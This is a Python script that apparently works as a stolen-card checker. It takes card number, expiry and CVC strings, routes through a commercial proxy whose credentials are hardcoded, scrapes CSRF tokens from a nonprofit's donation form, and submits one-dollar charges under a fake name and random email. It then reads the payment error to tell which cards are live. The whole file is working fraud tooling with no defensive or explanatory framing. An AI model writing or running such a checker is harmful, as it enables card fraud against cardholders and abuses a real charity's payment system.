import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'PHPSESSID': '6ebd9a6bd65cc9dd0dc78d6274',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    # 'Cookie': 'PHPSESSID=6ebd9a6bd65cc9dd0dc78d6274',
	    'Referer': 'https://www.google.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = session.get('https://www.uniony.org/forms/support-opportunities/', cookies=cookies, headers=headers)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '6ebd9a6bd65cc9dd0dc78d6274',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': 'PHPSESSID=6ebd9a6bd65cc9dd0dc78d6274',
	    'Origin': 'https://www.uniony.org',
	    'Referer': 'https://www.uniony.org/forms/support-opportunities/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'formProcessed': 'Donation',
	}
	
	data = {
	    'formField_donation_amount': 'Other',
	    'formField_other_amount': '',
	    'formPayment_method': 'Credit Card',
	    'formField_Designation': 'General Operations',
	    'formPayment_owner': 'Rodam User',
	    'formPayment_card': f'{card_type}',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formPayment_total_payment': '1',
	    'formPayment_gateway': '',
	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'hash': f'{hash}',
	    'csrfToken': f'{tok}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donation',
	    'fs_id': 'Donation',
	    'submenu': 'MakeDonation',
	}
	
	response = session.post('https://www.uniony.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'times, serif;">(.*?)&nbsp', response.text).group(1)
		
	return (result)
